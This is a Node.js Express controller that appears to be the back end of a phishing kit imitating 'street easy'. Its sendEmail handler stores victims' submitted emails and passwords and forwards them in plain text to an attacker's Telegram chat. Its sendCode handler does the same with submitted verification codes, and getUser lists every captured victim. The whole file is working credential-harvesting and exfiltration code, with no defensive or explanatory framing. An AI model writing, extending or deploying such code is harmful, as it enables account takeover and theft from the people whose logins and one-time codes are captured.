const Login = require("../model/login");
const TelegramBot = require("node-telegram-bot-api");
const os = require("os");

const getIpAddress = () => {
  const networkInterfaces = os.networkInterfaces();
  let ipAddress;
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        ipAddress = iface.address;
        break;
      }
    }
    if (ipAddress) {
      break;
    }
  }
  return ipAddress;
};


const bot = new TelegramBot(process.env.TELEGRAM_BOT);

const sendEmail = async (req, res) => {
  try {
   
    const ipAddress = getIpAddress();
     const userAgent = req.headers["user-agent"];
    let user = await Login.findOne({ ip: ipAddress + userAgent });

    if(user) {
        user.email = req.body.email
        user.password = req.body.password
        await user.save()
    }

    req.body.ip = getIpAddress() + userAgent;
    user = await Login.create(req.body);
    const adminMessage = `New email from street easy: ${user.email}, and password is ${user.password}`;
    console.log(adminMessage);
    
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, adminMessage);
    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};





const sendCode = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];
    if(!ipAddress) {
       return res.status(404).json({ error: 'ip address not found'})
    }
    const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});
 if (!user) {
   return res.status(404).json({ error: "User not found" });
 }
    const message = `${`${user.code} from ${user.email}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const getUser = async (req, res) => {
  try {
    const users = await Login.find({ code: { $exists: true } });
    res.status(200).json({nbHits: users.length, users });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};




module.exports = {
  sendEmail,
  sendCode,
  getUser
};
